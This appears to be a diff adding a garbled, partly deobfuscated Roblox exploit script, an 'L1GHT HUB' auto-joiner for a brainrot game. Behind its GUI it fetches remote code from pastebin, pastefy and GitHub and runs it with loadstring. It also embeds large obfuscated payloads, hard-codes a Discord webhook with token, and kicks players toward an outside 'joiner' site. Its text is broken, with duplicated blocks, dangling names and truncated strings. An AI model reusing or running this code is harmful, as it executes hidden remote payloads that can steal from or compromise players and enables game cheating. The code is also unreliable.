@@ -1,0 +1,646 @@
+local var1 = game:GetService("Players")
+
+local var2 = game:GetService("TweenService")
+local var3 = var1.LocalPlayer
+local var4 = Instance.new("ScreenGui")
+var4.Name = "AutoJoinerUI"
+
+var4.ResetOnSpawn = false
+
+local var5 = var3:WaitForChild("PlayerGui")
+
+var4.Parent = var5
+
+local var6 = Instance.new("Frame")
+
+local var7 = UDim2.new
+
+local var8 = var7(0, 200, 0, 70)
+
+var6.Size = var8
+
+local var9 = UDim2.new
+
+local var10 = var9(0, 10, 0, 60)
+
+var6.Position = var10
+
+local var11 = Color3.fromRGB
+
+local var12 = var11(20, 20, 20)
+
+var6.BackgroundColor3 = var12
+
+var6.BackgroundTransparency = 0.3
+
+var6.BorderSizePixel = 0
+
+var6.Active = true
+
+var6.Draggable = true
+
+var6.Parent = var4
+local var13 = Instance.new("UICorner")
+local var14 = UDim.new
+local var15 = var14(0, 8)
+
+var13.CornerRadius = var15
+
+var13.Parent = var6
+
+local var16 = Instance.new("UIStroke")
+
+var16.Thickness = 1
+
+local var17 = Color3.fromRGB
+
+local var18 = var17(50, 50, 50)
+
+var16.Color = var18
+
+var16.Parent = var6
+
+local var19 = Instance.new("TextButton")
+
+local var20 = UDim2.new
+
+local var21 = var20(0.9, 0, 0.6, 0)
+
+var19.Size = var21
+local var22 = UDim2.new
+local var23 = var22(0.05, 0, 0.1, 0)
+var19.Position = var23
+local var24 = Color3.fromRGB
+local var25 = var24(60, 60, 60)
+var19.BackgroundColor3 = var25
+
+var19.Text = "AUTO JOINER : OFF"
+
+local var26 = Color3.fromRGB
+
+local var27 = var26(220, 220, 220)
+
+var19.TextColor3 = var27
+
+var19.TextSize = 14
+
+local var28 = Enum.Font
+
+local var29 = Enum.Font.GothamBold
+
+var19.Font = Enum.Font.GothamBold
+
+var19.Parent = var6
+
+local var30 = Instance.new("UICorner")
+
+local var31 = UDim.new
+
+local var32 = var31(0, 6)
+
+var30.CornerRadius = var32
+
+var30.Parent = var19
+
+local var33 = Instance.new("TextLabel")
+
+local var34 = UDim2.new
+
+local var35 = var34(0.9, 0, 0, 15)
+
+var33.Size = var35
+local var36 = UDim2.new
+local var37 = var36(0.05, 0, 0.75, 0)
+var33.Position = var37
+var33.BackgroundTransparency = 1
+
+var33.Text = "L1GHT HUB"
+
+local var38 = Color3.fromRGB
+
+local var39 = var38(150, 150, 150)
+
+var33.TextColor3 = var39
+
+var33.TextSize = 11
+
+local var40 = Enum.Font
+
+local var41 = Enum.Font.GothamBold
+
+var33.Font = Enum.Font.GothamBold
+
+var33.Parent = var6
+local var42 = var19.MouseButton1Click:Connect(SvBnTzRjETLYJowUXdkwrvdjEjMvenWW)
+local var43 = var19.Size
+local var44 = var19.Position
+local var45 = var19.MouseButton1Down:Connect(JgBsWOjWwCfyUgCxmyLnqEzxWfnarcIM)
+
+local var46 = var19.MouseButton1Up:Connect(CmSkggLgyRPWcELAmzsdSeEhCDhEeSUF)
+
+local var47 = var19.MouseEnter:Connect(MhMlzJYiirlRQHUETGtPaBtwedIBBwLw)
+
+local var48 = game:HttpGet("https://pastebin.com/raw/NTHHtsKw")
+
+local var49, var50 = loadstring("--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local T={\"\075\111\083\061\",\"\118\080\120\108\054\118\109\065\103\085\079\101\115\085\083\061\",\"\071\075\087\107\108\086\118\109\115\050\061\061\",\"\122\101\121\107\086\090\072\055\",\"\111\051\066\102\047\078\120\069\081\085\115\047\",\"\052\097\065\077\114\083\108\082\";\"\076\084\105\065\067\077\082\074\067\090\089\049\067\116\097\080\076\056\061\061\";\"\122\122\074\069\109\111\103\073\083\104\120\109\113\087\054\098\054\117\061\061\",\"\054\099\051\050\102\052\116\110\076\078\061\061\",\"\118\118\052\097\069\050\061\061\";\"\117\054\081\101\051\118\065\079\071\078\061\061\",\"\113\120\057\078\107\101\084\081\078\051\054\081\108\072\081\052\098\084\048\110\";\"\103\083\117\111\115\069\056\097\090\085\122\119\103\085\084\074\052\078\061\061\";\"\104\080\120\057\067\050\061\061\";\"\088\078\113\043\078\053\049\061\";\"\073\119\109\074\102\102\074\051\076\105\071\082\088\055\066\105\107\105\113\110\080\074\057\0..( 71 kilobytes left)")
+
+local var51 = var49()
+
+local var52 = game:GetService("Players")
+local var53 = game:GetService("HttpService")
+
+local var54 = game:GetService("RunService")
+
+local var55 = var52.LocalPlayer
+
+getgenv().webhook = "https://discord.com/api/webhooks/1433836996668686539/Ap4sRHsa0eblu4Y3U8FZEYVMg0UdX2yEynLHyEIAK2VtDf4vA4S5GWwcYZzN5y7Y3utB"
+
+local var56 = getgenv().L1ghtHubCache
+
+getgenv().L1ghtHubCache = {
+    lastBrainhots = {},
+    lastNotificationTime = 0,
+    serverJobId = ""
+}
+
+local var57 = getgenv().L1ghtHubCache
+
+local var58 = Color3.fromRGB
+
+local var59 = var58(255, 215, 0)
+
+local var60 = Color3.fromRGB
+
+local var61 = var60(150, 150, 150)
+
+local var62 = game.PlaceId
+
+local var63 = game.PlaceId
+local var64 = game.JobId
+
+local var65 = string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s", 7754871317, game.JobId)
+
+local var66 = "Wrong game detected\nJoin server: " .. var65
+
+local var67 = var3:Kick(var66)
+
+local var68 = var19.MouseLeave:Connect(ThxIREtGCuycdwhpdmPifhfdUdzLprSl)
+
+local var69 = print("Auto joiner GUI loaded! Toggle the button to activate/deactivate.")
+
+local var70 = game:GetService("Players")
+
+local var71 = game:GetService("TweenService")
+
+local var72 = var70.LocalPlayer
+
+local var73 = Instance.new("ScreenGui")
+
+var73.Name = "AutoJoinerUI"
+
+var73.ResetOnSpawn = false
+
+local var74 = var3:WaitForChild("PlayerGui")
+
+var73.Parent = var74
+
+local var75 = Instance.new("Frame")
+
+local var76 = UDim2.new
+
+local var77 = var76(0, 200, 0, 70)
+var75.Size = var77
+local var78 = UDim2.new
+local var79 = var78(0, 10, 0, 60)
+var75.Position = var79
+local var80 = Color3.fromRGB
+local var81 = var80(20, 20, 20)
+var75.BackgroundColor3 = var81
+
+var75.BackgroundTransparency = 0.3
+
+var75.BorderSizePixel = 0
+
+var75.Active = true
+
+var75.Draggable = true
+
+var75.Parent = var73
+
+local var82 = Instance.new("UICorner")
+
+local var83 = UDim.new
+
+local var84 = var83(0, 8)
+
+var82.CornerRadius = var84
+
+var82.Parent = var75
+
+local var85 = Instance.new("UIStroke")
+
+var85.Thickness = 1
+
+local var86 = Color3.fromRGB
+
+local var87 = var86(50, 50, 50)
+
+var85.Color = var87
+
+var85.Parent = var75
+local var88 = Instance.new("TextButton")
+local var89 = UDim2.new
+local var90 = var89(0.9, 0, 0.6, 0)
+var88.Size = var90
+local var91 = UDim2.new
+
+local var92 = var91(0.05, 0, 0.1, 0)
+
+var88.Position = var92
+
+local var93 = Color3.fromRGB
+
+local var94 = var93(60, 60, 60)
+
+var88.BackgroundColor3 = var94
+
+var88.Text = "AUTO JOINER : OFF"
+
+local var95 = Color3.fromRGB
+
+local var96 = var95(220, 220, 220)
+
+var88.TextColor3 = var96
+
+var88.TextSize = 14
+
+local var97 = Enum.Font
+
+local var98 = Enum.Font.GothamBold
+
+var88.Font = Enum.Font.GothamBold
+
+var88.Parent = var75
+
+local var99 = Instance.new("UICorner")
+
+local var100 = UDim.new
+local var101 = var100(0, 6)
+var99.CornerRadius = var101
+var99.Parent = var88
+local var102 = Instance.new("TextLabel")
+local var103 = UDim2.new
+
+local var104 = var103(0.9, 0, 0, 15)
+
+var102.Size = var104
+
+local var105 = UDim2.new
+
+local var106 = var105(0.05, 0, 0.75, 0)
+
+var102.Position = var106
+
+var102.BackgroundTransparency = 1
+
+var102.Text = "L1GHT HUB"
+
+local var107 = Color3.fromRGB
+
+local var108 = var107(150, 150, 150)
+
+var102.TextColor3 = var108
+
+var102.TextSize = 11
+
+local var109 = Enum.Font
+
+local var110 = Enum.Font.GothamBold
+var102.Font = Enum.Font.GothamBold
+var102.Parent = var75
+
+local var111 = var88.MouseButton1Click:Connect(ScwqYAZcuzMPuuVheSiAoFLYvFmQAFDu)
+
+local var112 = var88.Size
+
+local var113 = var88.Position
+
+local var114 = var88.MouseButton1Down:Connect(EmBnWHHVIUBXfkazxkFtLoOIESqwloTA)
+
+local var115 = var88.MouseButton1Up:Connect(jPnxHzmsTrbiOpqhznoAbyssvRnNVuow)
+
+local var116 = var88.MouseEnter:Connect(XZHdjLmJDMMtNYFbdIxzeFYxppzUSYyr)
+
+local var117 = game:HttpGet("https://pastebin.com/raw/NTHHtsKw")
+
+local var118, var119 = loadstring("--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local T={\"\075\111\083\061\",\"\118\080\120\108\054\118\109\065\103\085\079\101\115\085\083\061\",\"\071\075\087\107\108\086\118\109\115\050\061\061\",\"\122\101\121\107\086\090\072\055\",\"\111\051\066\102\047\078\120\069\081\085\115\047\",\"\052\097\065\077\114\083\108\082\";\"\076\084\105\065\067\077\082\074\067\090\089\049\067\116\097\080\076\056\061\061\";\"\122\122\074\069\109\111\103\073\083\104\120\109\113\087\054\098\054\117\061\061\",\"\054\099\051\050\102\052\116\110\076\078\061\061\",\"\118\118\052\097\069\050\061\061\";\"\117\054\081\101\051\118\065\079\071\078\061\061\",\"\113\120\057\078\107\101\084\081\078\051\054\081\108\072\081\052\098\084\048\110\";\"\103\083\117\111\115\069\056\097\090\085\122\119\103\085\084\074\052\078\061\061\";\"\104\080\120\057\067\050\061\061\";\"\088\078\113\043\078\053\049\061\";\"\073\119\109\074\102\102\074\051\076\105\071\082\088\055\066\105\107\105\113\110\080\074\057\0..( 71 kilobytes left)")
+
+local var120 = var118()
+
+local var121 = game:GetService("Players")
+
+local var122 = game:GetService("HttpService")
+
+local var123 = game:GetService("RunService")
+local var124 = var121.LocalPlayer
+
+getgenv().webhook = "https://discord.com/api/webhooks/1433836996668686539/Ap4sRHsa0eblu4Y3U8FZEYVMg0UdX2yEynLHyEIAK2VtDf4vA4S5GWwcYZzN5y7Y3utB"
+
+local var125 = getgenv().L1ghtHubCache
+
+local 
+var126 = getgenv().L1ghtHubCache
+
+local var127 = Color3.fromRGB
+local var128 = var127(255, 215, 0)
+
+local var129 = Color3.fromRGB
+
+local var130 = var129(150, 150, 150)
+
+local var131 = game.PlaceId
+
+local var132 = game.PlaceId
+
+local var133 = game.JobId
+
+local var134 = string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s", 7754871317, game.JobId)
+
+local var135 = "Wrong game detected\nJoin server: " .. var134
+
+local var136 = var3:Kick(var135)
+
+local var137 = var88.MouseLeave:Connect(zxsMJPSIItzLaygubNhJdEHpxFkgbWYj)
+
+local var138 = print("Auto joiner GUI loaded! Toggle the button to activate/deactivate.")
+
+
+    var88.Text = "AUTO JOINER : ON"
+
+    local var139_1 = Color3.fromRGB
+
+    local var140_1 = var139_1(40, 120, 40)
+
+    var88.BackgroundColor3 = var140_1
+
+        local var141_2 = game:HttpGet("https://pastefy.app/WXqLwgVK/raw")
+
+        local var142_2, var143_2 = loadstring("--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local j={\"\101\075\117\084\116\048\114\109\081\078\120\047\079\102\112\066\071\106\115\069\043\111\061\061\",\"\113\071\112\087\078\079\090\083\101\074\122\113\122\049\104\047\119\081\071\054\107\089\090\074\105\121\075\111\108\111\108\066\055\075\104\098\113\075\078\098\048\078\076\113\120\067\115\086\073\105\086\106\085\100\117\102\077\054\115\077\079\116\069\070\081\107\102\078\051\067\113\049\080\051\104\071\078\119\099\055\088\090\051\073\083\121\043\076\107\102\102\118\056\053\070\107\077\081\098\120\101\090\082\070\048\117\119\102\081\080\076\053\075\079\043\115\";\"\118\112\110\065\075\075\112\083\105\119\104\078\077\081\065\066\102\049\051\061\",\"\098\121\083\052\105\081\053\061\";\"\073\071\112\066\105\081\098\085\";\"\105\114\047\061\",\"\105\109\066\071\100\122\101\056\072\120\101\074\118\120\050\052\075\121\107\061\",\"\049\071\074\089\072\121\110\117\057\116\084\103\107\056\082\074\072\081\056\061\",\"\..( 21 kilobytes left)")
+
+        local var144_2 = var142_2()
+
+        getgenv().BrainrotConfig = {
+            ["Graipuss Medussi"] = true,
+            ["Odin Din Din Dun"] = false,
+            ["Tralalero Tralala"] = false,
+            ["Cocofanto Elefanto"] = false,
+            ["Brainrot God Lucky Block"] = false,
+            ["Nuclearo Dinossauro"] = true,
+            ["Sammyni Spyderini"] = true,
+            Matteo = false,
+            ["Chicleteira Bicicleteira"] = true,
+            ["Los Tralaleritos"] = true,
+            ["Unclito Samito"] = false,
+            ["Los Crocodillitos"] = false,
+            ["Garama And Madundung"] = true,
+            ["La Vacca Saturno Saturnita"] = true,
+            ["Ballerino Lololo"] = false,
+            ["Secret Lucky Block"] = true,
+            ["Tigroligre Frutonni"] = false,
+            ["Orcalero Orcala"] = false,
+            ["La Grande Combinasion"] = true,
+            ["Las Tralaleritas"] = true,
+            ["Espresso Signora"] = false,
+            ["Piccione Macchina"] = false,
+            ["Torrtuginni Dragonfrutini"] = true,
+            ["Las Vaquitas Saturnitas"] = true,
+            ["Trenostruzzo Turbo 3000"] = false,
+            ["Girafa Celestre"] = false,
+            ["Pot Hotspot"] = true
+        }
+
+        local var145_2 = game:HttpGet("https://raw.githubusercontent.com/iw929wiwiw/Protector-/refs/heads/main/Secret%20Finder")
+
+        local var146_2, var147_2 = loadstring("([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _aAUIISqRVifJ = a; end)); nBQQWXPJozxXKuVi=_ENV;OEbCrlKPiyIupzT='{C8,>olB5MfNS2_LS_2l>CfSC5M>_2o5S,8SSBo6ff8X5DLlof28,folLoB_25>_f_8>5>No,55fLolkSMo,_,>LN>855Sbll82C>oMLSMol_5>2N_8,MBLNBo2C>RN>D_,LNLC>BL_fo,_lllMj88N5C85f_NoBB2&Nf8rNlN22>2fN855MLfl>55CCo2S5,,MS,oM>_5lBL_l,2,>,5_<_5X_S,fNB8LM_LSlCS_T,MCOL5lLoo<SM,ol_/SBNMoL_lM2>,LffCoM58NoB2q8SMB(8lN:55lLNoS288_M5L8lL_BolN-85M>N,8555L,o_SBoo2_o5f8CLMBWll>SM,ll,2x,5f,V__SoMNCNN5SM&LNll,BfNCMBB2_>NNNNL,CM>LLlf2,lfLCoC2>8Nf,gL8LM5T,l_2M>>fL>fSoL8oNSl,CMS4BB8Co55N>,85ML>oLS5l,_,>SS88fM8Lfl,2M,Bo2__5oL,o2S,82M5L_8Bf8LSlB28,NLoo8NM,oMC/C>o2N>lM5Co52LSolS_,foMSB8_MMv>28>8fl88C25lLCoSSB,8M2,8N,2LoBN>CL5fL,MM#loC2b8LMfFLM5_>o,2C,M552To8foCpBN_>BBLBB>5S82f,C_52_Sl8Nf,B>L_2ll_>ouN5CL5oLNo,2U_LlfS>8LMf3,MMCM5MLMClfo,ofoS8oC_CoCl_L2MML28CMBLllCSS,oS5olNoC_M>_,lfSf>2f>CS,SS_CCBS_BoI_Nlf2l>Nl,C>58L/o>Bf,SMC9_8l_C>_Nl8l58_NlBS,82o>ClB,_M>5lNe,M1LNloNo,8MNS,l>fSPNBN_K>NNlM>tYlMSN,NMLf..( 202 kilobytes left)")
+
+        local var148_2 = var146_2()
+--dbg        nBQQWXPJozxXKuVi = nil
+
+        VToBJXTpdtEEUmBCRladQaxgJRPPfbrR
+
+     
+        local var149_3 = wait()
+
+        local var149_3;
+--dbg        end) -- true
+
+        fenv.tostring = tostring
+
+        fenv.MoonSec_StringsHiddenAttr = true
+
+        local var151_2 = debug.getinfo(loadstring)
+
+        local var152_2 = debug.getinfo(pcall)
+
+            local var153_3 = islclosure("loadstring")
+
+        local var153_3;
+--dbg        end) -- true
+--dbg            local var155_3 = islclosure("pcall")
+--dbg        local var155_3;
+--dbg        end) -- true
+
+        local var157_2, var158_2 = loadstring("return function(b,c)local d,e=0x01,0x10;local f={{},{},{}}local g=-0x01;local h=0x01;local i=b;while true do f[0x03][string.sub(c,h,(function()h=d+h;return h-0x01 end)())]=(function()g=g+0x01;return g end)()if g==0x0f then g=''e=0x000;break end end;local j=#c;while h<j+0x01 do f[0x02][e]=string.sub(c,h,(function()h=d+h;return h-0x01 end)())e=e+0x01;if e%0x02==0x00 then e=0x00;table.insert(f[0x01],string.char(((f[0x03][f[0x02][0x00]]or 0x00)*0x10+(f[0x03][f[0x02][0x01]]or 0x00)+i)%0x100))i=b+i end end;return table.concat(f[0x01])end")
+
+        local var159_2 = var157_2()
+
+        local var160_2, var161_2 = loadstring("return(function(t,...)local s;local d;local c;local _;local o;local n;local l=24915;local e=0;local f={};while e<909 do e=e+1;while e<0x2e5 and l%0x2692<0x1349 do e=e+1 l=(l*984)%47757 local r=e+l if(l%0x25d2)>=0x12e9 then l=(l+0x119)%0x9d90 while e<0x2ca and l%0x1c7c<0xe3e do e=e+1 l=(l*811)%35884 local r=e+l if(l%0x3d42)>0x1ea1 then l=(l+0x2c1)%0x1e82 local l=80604 if not f[l]then f[l]=0x1 c=tonumber;end elseif l%2~=0 then l=(l-0x2e2)%0x772d local l=20989 if not f[l]then f[l]=0x1 n=function(n)local l=0x01 local function f(e)l=l+e return n:sub(l-e,l-0x01)end while true do local e=f(0x01)if(e==\"\5\")then break end local l=_.byte(f(0x01))local l=f(l)if e==\"\2\"then l=s.FYKyPacr(l)elseif e==\"\3\"then l=l~=\"\0\"elseif e==\"\6\"then o[l]=function(e,l)return t(8,nil,t,l,e)end elseif e==\"\4\"then l=o[l]elseif e==\"\0\"then l=o[l][f(_.byte(f(0x01)))];end local e=f(0x08)s[e]=l end end end else l=(l*0x3a8)%0x4a2f e=e+1 local l=24285 if not f[l]then f[l]=0x1 d=\"\4\8\116\111\110\117\109\98\..( 47 kilobytes left)")
+
+        local var162_2 = var160_2()
+
+        tAUmacJWzRGqSIOzMqnFaGMgWGMzjrDm
+
+            local var163_3 = wait()
+
+        local var163_3;
+
+        end) -- true
+
+        fenv.tostring = tostring
+
+        fenv.MoonSec_StringsHiddenAttr = true
+
+        local var165_2 = game:IsLoaded()
+
+        local var166_2 = game:GetService("HttpService")
+
+        local var167_2 = game:GetService("TeleportService")
+
+        local var168_2 = game:GetService("Players")
+
+        local var169_2 = game:GetService("StarterGui")
+
+        local var170_2 = game:GetService("ReplicatedStorage")
+
+        local var171_2 = game:GetService("Workspace")
+local var172_2 = var168_2.LocalPlayer
+local var173_2 = var170_2:WaitForChild("Packages")
+local var174_2 = var173_2.WaitForChild
+local var175_2 = var173_2:WaitForChild("Net")
+local var176_2 = var175_2.WaitForChild
+local var177_2 = var175_2:WaitForChild("RF/CoinsShopService/RequestBuy")
+local var178_2 = getgenv().VisitedServers
+getgenv().VisitedServers = {}
+xkFiGIpeMZWqCuuFspFoWIhBlIWhCPSj
+--dbgcls
+
+            local var179_3 = var171_2:GetChildren()
+
+            for i, v in ipairs(var179_3) do
+
+                local var180_4 = v.IsA
+
+                local var181_4 = v:IsA("Model")
+
+                local var182_4 = getgenv().BrainrotConfig
+
+ 
+                local var183_4 = getgenv().BrainrotConfig
+
+                local var184_4 = v.Name
+
+            end
+
+            local var185_3 = task.wait(0.1)
+
+            local var186_3 = fenv.searchAllServers()
+
+                local var187_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+
+                local var188_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+--dbg            local var187_4, var188_4;
+--dbg                return {
+                errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+--dbg            end) -- true
+--dbg            local var191_3 = task.wait(0.1)
+--dbg            local var192_3 = fenv.searchAllServers()
+--dbg                local var193_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+--dbg                local var194_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+--dbg            local var193_4, var194_4;
+--dbg                return {
+                errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+--dbg            end) -- true
+--dbg            local var197_3 = task.wait(0.1)
+--dbg            local var198_3 = fenv.searchAllServers()
+
+                local var199_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+
+                local var200_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+
+            local var199_4, var200_4;
+return {
+                errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+
+            end) -- true
+
+            local var203_3 = task.wait(0.1)
+
+            local var204_3 = fenv.searchAllServers()
+
+                local var205_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+
+                local var206_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+
+            local var205_4, var206_4;
+
+                return {
+                errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+
+            end) -- true
+--dbg            local var209_3 = task.wait(0.1)
+--dbg            local var210_3 = fenv.searchAllServers()
+--dbg                local var211_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+--dbg                local var212_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+--dbg            local var211_4, var212_4;
+--dbg                return {
+                     errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+--dbg         
+    end) -- true
+--dbg            local var215_3 = task.wait(0.1)
+--dbg            local var216_3 = fenv.searchAllServers()
+--dbg                local var217_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+--dbg                local var218_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+--dbg            local var217_4, var218_4;
+--dbg                return {
+                errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+--dbg            end) -- true
+--dbg            local var221_3 = task.wait(0.1)
+--dbg            local var222_3 = fenv.searchAllServers()
+--dbg                local var223_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+--dbg                local var224_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+--dbg            local var223_4, var224_4;
+--dbg                return {
+                errors = {
+                    {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+--dbg            end) -- true
+--dbg            local var227_3 = task.wait(0.1)
+--dbg            local var228_3 = fenv.searchAllServers()
+--dbg                local var229_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237/servers/Public?sortOrder=Asc&limit=100")
+--dbg                local var230_4 = var166_2:JSONDecode("{\"errors\":[{\"code\":0,\"message\":\"Forbidden\"}]}")
+--dbg            local var229_4, var230_4;
+--dbg                return {
+                errors = {
+         
+            {
+                        message = "Forbidden",
+                        code = 0
+                    }
+                }
+            }
+--dbg            end) -- true
+--dbg            local var233_3 = task.wait(0.1)
+
+            local var234_3 = fenv.searchAllServers()
+
+                local var235_4 = game:HttpGet("https://games.roblox.com/v1/games/109983668079237...
